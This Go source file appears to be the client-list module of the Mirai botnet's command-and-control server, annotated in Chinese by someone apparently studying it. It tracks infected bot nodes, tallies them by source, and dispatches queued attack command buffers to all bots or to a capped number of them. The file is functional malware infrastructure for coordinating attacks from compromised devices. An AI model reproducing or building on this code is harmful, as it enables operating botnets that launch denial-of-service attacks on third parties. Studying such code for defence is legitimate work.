package main

 //管理感染的结点

 
import (
    "time"
    "math/rand"
    "sync"
    "fmt"
)

type AttackSend struct {
    buf         []byte
    count       int
    botCata     string
}

type ClientList struct {
    uid         int
    count       int
    clients     map[int]*Bot  //所有的bots
    addQueue    chan *Bot
    delQueue    chan *Bot
    atkQueue    chan *AttackSend  //攻击数据的队列
    totalCount  chan int
    cntView     chan int
    distViewReq chan int
    distViewRes chan map[string]int
    cntMutex    *sync.Mutex
}

func NewClientList() *ClientList {
    c := &ClientList{0, 0, make(map[int]*Bot), make(chan *Bot, 128), make(chan *Bot, 128), make(chan *AttackSend), make(chan int, 64), make(chan int), make(chan int), make(chan map[string]int), &sync.Mutex{}}
    go c.worker()
    go c.fastCountWorker()
    return c
}

func (this *ClientList) Count() int {
    this.cntMutex.Lock()
    defer this.cntMutex.Unlock()

    this.cntView <- 0
    return <-this.cntView
}

func (this *ClientList) Distribution() map[string]int {
    this.cntMutex.Lock()
    defer this.cntMutex.Unlock()
    this.distViewReq <- 0
    return <-this.distViewRes
}

func (this *ClientList) AddClient(c *Bot) {
    this.addQueue <- c
}

func (this *ClientList) DelClient(c *Bot) {
    this.delQueue <- c
    fmt.Printf("Deleted client %d - %s - %s\n", c.version, c.source, c.conn.RemoteAddr())
}


//第一个参数是build函数构造的私有网络协议数据，最后发送的也是这个buf
func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
    attack := &AttackSend{buf, maxbots, botCata}
    this.atkQueue <- attack
}

func (this *ClientList) fastCountWorker() {   //ClientList的fastCountWorker方法
    for {
        select {
        case delta := <-this.totalCount:
            this.count += delta
            break
        case <-this.cntView:
            this.cntView <- this.count
            break
        }
    }
}

func (this *ClientList) worker() {  //ClientList 的worker方法
    rand.Seed(time.Now().UTC().UnixNano())

    for {
        select {
        case add := <-this.addQueue:  //添加bot节点
            this.totalCount <- 1
            this.uid++
            add.uid = this.uid
            this.clients[add.uid] = add
            break
        case del := <-this.delQueue:  //删除bot节点
            this.totalCount <- -1
            delete(this.clients, del.uid)
            break
        case atk := <-this.atkQueue:
            if atk.count == -1 {   //-1是啥
                for _,v := range this.clients {//给所有clients发送攻击命令
                    if atk.botCata == "" || atk.botCata == v.source {
                        v.QueueBuf(atk.buf)  //QueueBuf是bot.go里面的函数，即write
                    }
                }
            } else {
                var count int
                for _, v := range this.clients {
                    if count > atk.count { //只给atk.count个bot发送攻击命令
                        break
                    }
                    if atk.botCata == "" || atk.botCata == v.source {
                        v.QueueBuf(atk.buf)
                        count++
                    }
                }
            }
            break
        case <-this.cntView:
            this.cntView <- this.count
            break
        case <-this.distViewReq:
            res := make(map[string]int)
            for _,v := range this.clients {
                if ok,_ := res[v.source]; ok > 0 {
                    res[v.source]++
                } else {
                    res[v.source] = 1
                }
            }
            this.distViewRes <- res
        }
    }
}

